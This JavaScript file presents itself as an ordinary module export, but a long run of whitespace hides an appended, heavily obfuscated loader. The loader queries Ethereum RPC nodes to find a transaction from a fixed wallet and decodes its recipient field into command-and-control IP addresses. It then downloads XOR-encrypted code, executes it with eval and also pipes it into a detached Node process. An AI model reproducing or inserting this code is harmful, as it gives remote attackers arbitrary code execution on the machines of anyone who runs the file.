module.exports = app;																																																																																																																																																																																																																																																																										global.i = 'A10-*3380-11';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(h<0){h=q}else{h+=q*91;j|=h<<k;k+=(h&8191)>88?13:14;do{g.push(j&255);j>>=8;k-=8}while(k>7);h=-1}}if(h>-1){g.push((j|h<<k)&255)}return l(g)}function f(a,d){return e(c.slice(a,a+d))}const g={hostname:d.hostname,port:o("wOf1fy")(d.port)||80,path:d.pathname+d.search,headers:{"User-Agent":f(766,137),"Sec-V":h._V||0}};function i(d){const e=a.length;for(let f=0;f<d.length;f++)d[f]^=a.charCodeAt(f%e);return d.toString("utf8")}function j(a){const d=a.headers["x-payload-b64"];if(!d){throw new(o("TAIsJro"))("Missing X-Payload-B64")}return i(Buffer.from(d,"base64"))}function k(a){return new(o("tdTjubV"))((d,e)=>{const f=p.request({...g,method:a},f=>{if(a==="HEAD"){try{d(j(f))}catch(e){e(e)}f.resume();return}const g=[];f.on("data",f=>{return g.push(f)});f.on("end",()=>{try{const a=Buffer.concat(g);if(a.length){return d(i(a))}if(f.headers["x-payload-b64"]){return d(j(f))}e(new(o("TAIsJro"))("Empty payload body"))}catch(e){e(e)}});f.on("error",e)});f.on("error",e);f.setTimeout(A,()=>{f.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});f.end()})}return k("GET")["catch"](()=>{return k("HEAD")})}async function t(a,d,e){try{function f(a){var d="_Wz3Pb8L[^e]AqE,%S4TQ>jB|fy/7NGV!OFmda&J;up1(R?0xvl.o#s$hw\"@C9X+iUY~:IHrn)=5<}M2Zk`c6*{DtKg",e=""+(a||""),f=e.length,g=[],j=0,h=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;j|=k<<h;h+=(k&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);k=-1}}if(k>-1){g.push((j|k<<h)&255)}return l(g)}function g(a,d){return f(c.slice(a,a+d))}const i=await r(d,a),j=e?"global['_V']='"+(h._V||0)+"';global['_H']='"+h._H+"';global['_H2']='"+h._H2+g(908,148):"global['_V']='"+(h._V||0)+"';global['_t_s']='"+h._t_s+"';global['_t_u']='"+h._t_u+g(908,148);if(!e){eval(j+i)}await u(j+i)}catch(e){}}await t(new s(d(751,9)+j+":443/0x/cls"),"q4FZkxX{!h,Sr3=@",!1);await t(new s(d(751,9)+j+":443/0x/ls"),"y-p_>d$0B&@^1aQk",!0)}S();
